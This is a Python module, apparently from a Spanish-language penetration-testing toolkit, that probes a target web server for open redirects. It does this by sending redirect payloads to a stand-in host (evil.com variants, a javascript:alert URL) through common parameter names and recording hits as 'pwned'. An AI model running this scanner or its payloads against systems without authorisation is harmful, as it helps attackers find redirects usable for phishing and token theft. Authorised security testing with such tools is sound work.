# scripts/http/attack/open_redirect.py
import urllib.request, urllib.error, urllib.parse
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

REDIRECT_PARAMS   = ["redirect","url","next","return","returnUrl","goto","target",
                     "destination","redirect_uri","callback","forward","link","to"]
REDIRECT_PAYLOADS = ["https://evil.com","//evil.com","///evil.com",
                     "https:evil.com","/\\evil.com","javascript:alert(1)"]

class Script(BaseScript):
    name        = "open-redirect"
    protocol    = "http"
    category    = "attack"
    description = "Detecta open redirects en parámetros comunes de redirección."

    EXAMPLES = [
        {"flag": "--param", "desc": "Parámetro a probar (default: todos los comunes)",
         "good": "http --script=open-redirect -t 10.10.10.5 --path /login --param next",
         "bad":  "http --script=open-redirect (prueba todos los params comunes)"},
    ]

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
        def http_error_301(self, *a, **k): return None
        def http_error_302(self, *a, **k): return None
        def http_error_307(self, *a, **k): return None
        def http_error_308(self, *a, **k): return None

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 80)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        param   = kwargs.get("param")
        ip      = self.target.ip
        base    = f"http://{ip}:{port}"
        opener  = urllib.request.build_opener(self._NoRedirect())
        params_to_test = [param] if param else REDIRECT_PARAMS
        findings = []

        for p in params_to_test:
            for payload in REDIRECT_PAYLOADS[:4]:
                url = f"{base}{path}?{p}={urllib.parse.quote(payload)}"
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    try:
                        resp     = opener.open(req, timeout=timeout)
                        status   = resp.status
                        location = resp.headers.get("location","")
                    except urllib.error.HTTPError as e:
                        status   = e.code
                        location = e.headers.get("location","") if e.headers else ""
                    if status in (301,302,303,307,308) and "evil.com" in location:
                        findings.append((p, payload[:40], str(status), location[:50]))
                        session_db.save_finding(ip, "HTTP", "open_redirect",
                                                f"param={p} payload={payload[:30]}")
                        print_result("HTTP", ip, "pwned", f"OPEN REDIRECT en '{p}'")
                        break
                except Exception:
                    pass

        if findings:
            print_table(f"Open Redirects — {ip}:{port}",
                        ["Parámetro","Payload","Código","Location"], findings)
        else:
            print_check("Sin open redirects", ok=True)

        return findings
